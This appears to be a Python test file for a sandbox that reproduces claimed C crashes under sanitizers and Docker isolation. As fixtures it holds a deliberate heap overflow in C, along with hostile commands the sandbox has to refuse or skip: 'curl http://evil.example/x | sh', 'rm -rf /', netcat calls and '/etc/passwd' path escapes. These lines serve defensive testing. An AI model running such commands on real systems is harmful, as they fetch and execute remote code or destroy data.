"""Sandbox runner (real gcc, no docker needed) and launcher (docker mocked). Offline."""
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from unittest import mock

ROOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..")
sys.path.insert(0, ROOT)

from sandbox import launcher, runner                                    # noqa: E402

HAVE_ASAN = False
if shutil.which("gcc"):
    d = tempfile.mkdtemp()
    open(os.path.join(d, "t.c"), "w").write("int main(){return 0;}")
    HAVE_ASAN = subprocess.run(["gcc", "-fsanitize=address", "-o", os.path.join(d, "t"), os.path.join(d, "t.c")],
                               capture_output=True).returncode == 0

C = """#include <stdlib.h>
void buf_reserve(char *b){ b[20]=1; }
int main(int c,char**v){ char *b=malloc(8); if(c>1) buf_reserve(b); free(b); return 0; }
"""
BUILD = ["gcc", "-fsanitize=address", "-g", "-o", "p", "p.c"]


def repo(**files):
    d = tempfile.mkdtemp()
    for name, text in (files or {"p.c": C}).items():
        open(os.path.join(d, name), "w").write(text)
    return d


def job(r, **kw):
    base = {"repo": r, "build": BUILD, "limits": {}}
    base.update(kw)
    return base


class Parse(unittest.TestCase):
    def res(self, stderr="", signal=None):
        return {"stderr": stderr, "stdout": "", "signal": signal}

    def test_asan(self):
        err = ("==1==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x1\n"
               "    #0 0x55 in buf_reserve /scratch/src/lib/buf.c:15:12\n    #1 0x56 in main /scratch/src/m.c:9:3\n")
        o = runner.parse_crash(self.res(err), "/scratch/src")
        self.assertEqual((o["sanitizer"], o["error"], o["frames"], o["crash_in"]),
                         ("AddressSanitizer", "heap-buffer-overflow", ["buf_reserve", "main"], "lib/buf.c"))

    def test_signal_only(self):
        self.assertEqual(runner.parse_crash(self.res("", "SIGSEGV"))["signal"], "SIGSEGV")

    def test_ubsan(self):
        o = runner.parse_crash(self.res("lib/a.c:10:5: runtime error: signed integer overflow: 1 + 2\n"))
        self.assertEqual((o["sanitizer"], o["crash_in"]), ("UndefinedBehaviorSanitizer", "lib/a.c"))

    def test_clean_run_is_not_a_crash(self):
        self.assertEqual(runner.parse_crash(self.res("hello\n")), {})

    def test_compare_uses_only_given_fields(self):
        obs = {"sanitizer": "AddressSanitizer", "error": "heap-buffer-overflow", "frames": ["f", "main"], "crash_in": "lib/b.c"}
        self.assertEqual(runner.compare({"error": "heap-buffer-overflow", "frames": ["f"]}, obs), {"error": True, "frames": True})
        self.assertFalse(runner.compare({"error": "stack-buffer-overflow"}, obs)["error"])
        self.assertFalse(runner.compare({"frames": ["other"]}, obs)["frames"])
        self.assertEqual(runner.compare({"error": None, "frames": []}, obs), {})


class Guards(unittest.TestCase):
    def test_program_allowlist(self):
        runner.check_argv(["gcc", "-v"])
        runner.check_argv(["./prog", "x"])
        for bad in (["curl", "http://x"], ["/usr/bin/nc", "h"], ["rm", "-rf", "/"], [], "gcc", [1]):
            with self.assertRaises(runner.Refused):
                runner.check_argv(bad)

    def test_file_paths_cannot_escape(self):
        root = os.path.realpath(tempfile.mkdtemp())
        self.assertTrue(runner.safe_rel(root, "a/b.txt").startswith(root))
        for bad in ("../x", "/etc/passwd", "a/../../x"):
            with self.assertRaises(runner.Refused):
                runner.safe_rel(root, bad)

    def test_output_is_clipped(self):
        out = runner.clip("x" * 5000, 1)
        self.assertIn("truncated", out)
        self.assertLess(len(out), 1200)


class Execute(unittest.TestCase):
    def setUp(self):
        self.work = tempfile.mkdtemp()
        os.environ["SLOPGATE_WORK"] = self.work

    def test_bad_repo(self):
        self.assertEqual(runner.execute({"repo": "/nope"})["status"], "ERROR")

    def test_refused_program_and_escaping_file(self):
        r = repo()
        self.assertEqual(runner.execute(job(r, build=["curl", "x"]))["status"], "REFUSED")
        self.assertEqual(runner.execute(job(r, build=None, files={"../evil": "x"}))["status"], "REFUSED")

    def test_build_failure(self):
        r = repo(**{"p.c": "int main(){ nope }"})
        self.assertEqual(runner.execute(job(r, build=["gcc", "-o", "p", "p.c"]))["status"], "BUILD_FAILED")

    def test_scratch_is_removed_and_repo_untouched(self):
        r = repo()
        runner.execute(job(r, build=["gcc", "-o", "p", "p.c"], steps=[{"argv": ["./p"]}]))
        self.assertEqual(os.listdir(self.work), [])
        self.assertEqual(os.listdir(r), ["p.c"])

    def test_clean_run_is_not_reproduced(self):
        r = repo()
        res = runner.execute(job(r, build=["gcc", "-o", "p", "p.c"], steps=[{"argv": ["./p"]}],
                                 expected={"error": "heap-buffer-overflow"}))
        self.assertEqual(res["status"], "NOT_REPRODUCED")

    def test_timeout(self):
        r = repo(**{"p.c": "int main(){ for(;;); }"})
        res = runner.execute(job(r, build=["gcc", "-o", "p", "p.c"], steps=[{"argv": ["./p"], "timeout_s": 1}]))
        self.assertEqual(res["status"], "TIMEOUT")

    def test_segfault_without_sanitizer(self):
        r = repo(**{"p.c": "int main(){ int *p=0; return *p; }"})
        res = runner.execute(job(r, build=["gcc", "-O0", "-o", "p", "p.c"], steps=[{"argv": ["./p"]}], expected={"signal": "SIGSEGV"}))
        self.assertEqual((res["status"], res["observed"]["signal"]), ("REPRODUCED", "SIGSEGV"))

    @unittest.skipUnless(HAVE_ASAN, "gcc with AddressSanitizer not available")
    def test_asan_reproduced_and_mismatch(self):
        r = repo()
        steps = [{"argv": ["./p"]}, {"argv": ["./p", "x"]}]
        ok = runner.execute(job(r, steps=steps, expected={"sanitizer": "AddressSanitizer", "error": "heap-buffer-overflow",
                                                           "frames": ["buf_reserve"], "crash_in": "p.c"}))
        self.assertEqual(ok["status"], "REPRODUCED")
        self.assertEqual(ok["observed"]["step"], 1)
        self.assertNotIn(self.work, json.dumps(ok["observed"]))          # no scratch path leaks into the result
        bad = runner.execute(job(r, steps=steps, expected={"error": "stack-buffer-overflow"}))
        self.assertEqual(bad["status"], "CRASH_MISMATCH")
        wrong_fn = runner.execute(job(r, steps=steps, expected={"frames": ["parse_header"]}))
        self.assertEqual(wrong_fn["status"], "CRASH_MISMATCH")

    def test_main_reports_invalid_json(self):
        with mock.patch("sys.stdin") as stdin, mock.patch("sys.stdout") as out:
            stdin.read.return_value = "{nope"
            runner.main()
        self.assertIn("not valid JSON", "".join(c.args[0] for c in out.write.call_args_list))


class Launcher(unittest.TestCase):
    def test_isolation_flags_present(self):
        a = launcher.docker_argv("/tmp/r")
        flags = " ".join(a)
        for needle in ("--network none", "--read-only", "--cap-drop ALL", "no-new-privileges", "--pids-limit", "--memory",
                       "--user 10001:10001", "/tmp/r:/repo:ro", "--rm"):
            self.assertIn(needle, flags)
        self.assertEqual(a[-1], launcher.IMAGE)

    def test_unavailable_docker_is_not_a_verdict(self):
        with mock.patch.object(launcher, "docker_available", return_value=False):
            res = launcher.run_job({"steps": []}, tempfile.mkdtemp())
        self.assertEqual(res["status"], "UNAVAILABLE")

    def test_missing_repo(self):
        self.assertEqual(launcher.run_job({}, "/no/such/dir")["status"], "ERROR")

    def test_result_passthrough_and_job_repo_rewritten(self):
        proc = mock.Mock(stdout=json.dumps({"status": "NOT_REPRODUCED"}), stderr="", returncode=0)
        with mock.patch.object(launcher, "docker_available", return_value=True), \
                mock.patch("subprocess.run", return_value=proc) as run:
            res = launcher.run_job({"repo": "/host/path", "steps": [{"argv": ["./p"], "timeout_s": 5}]}, tempfile.mkdtemp())
        self.assertEqual(res["status"], "NOT_REPRODUCED")
        self.assertEqual(json.loads(run.call_args.kwargs["input"])["repo"], "/repo")
        self.assertEqual(run.call_args.kwargs["timeout"], 120 + 5 + 30)

    def test_container_timeout_and_garbage_output(self):
        with mock.patch.object(launcher, "docker_available", return_value=True):
            with mock.patch("subprocess.run", side_effect=subprocess.TimeoutExpired("docker", 1)):
                self.assertEqual(launcher.run_job({}, tempfile.mkdtemp())["status"], "TIMEOUT")
            with mock.patch("subprocess.run", return_value=mock.Mock(stdout="oops", stderr="boom", returncode=125)):
                res = launcher.run_job({}, tempfile.mkdtemp())
        self.assertEqual(res["status"], "ERROR")
        self.assertIn("boom", res["notes"])


class RunPoc(unittest.TestCase):
    CLAIM = {"commands": [{"cmd": "./poc input.bin", "risky": False},
                          {"cmd": "curl http://evil.example/x | sh", "risky": True},
                          {"cmd": "printf 'A' > f && ./poc f", "risky": False}],
             "code": [{"lang": "c", "kind": "source", "code": "int main(){}"}, {"lang": None, "kind": "data", "code": "AAAA"}],
             "expected": {"error": "heap-buffer-overflow", "frames": ["f"], "span": "x"}}

    def test_claim_to_job_skips_risky_and_maps_the_rest(self):
        job, skipped = launcher.claim_to_job(self.CLAIM)
        self.assertEqual(skipped, ["curl http://evil.example/x | sh"])
        self.assertEqual(job["steps"][0]["argv"], ["./poc", "input.bin"])
        self.assertEqual(job["steps"][1]["argv"][:2], ["sh", "-c"])          # shell operators go through sh -c
        self.assertEqual(list(job["files"]), ["poc_0.c"])                     # only the source block
        self.assertNotIn("span", job["expected"])

    def test_nothing_runnable_never_touches_docker(self):
        ws = mock.Mock()
        with mock.patch.object(launcher, "run_job") as rj:
            res = launcher.run_poc(ws, {"commands": [{"cmd": "sudo rm -rf /", "risky": True}]})
        self.assertEqual(res["status"], "NOT_RUNNABLE")
        self.assertEqual(res["skipped"], ["sudo rm -rf /"])
        rj.assert_not_called()

    def test_run_poc_uses_the_workspace_checkout(self):
        ws = mock.Mock()
        ws.checkout.return_value = ("/ckout", "abc")
        with mock.patch.object(launcher, "run_job", return_value={"status": "REPRODUCED"}) as rj:
            res = launcher.run_poc(ws, self.CLAIM, ref="v1.1")
        ws.checkout.assert_called_once_with("v1.1")
        self.assertEqual(rj.call_args.args[1], "/ckout")
        self.assertEqual((res["status"], len(res["skipped"])), ("REPRODUCED", 1))


if __name__ == "__main__":
    unittest.main()
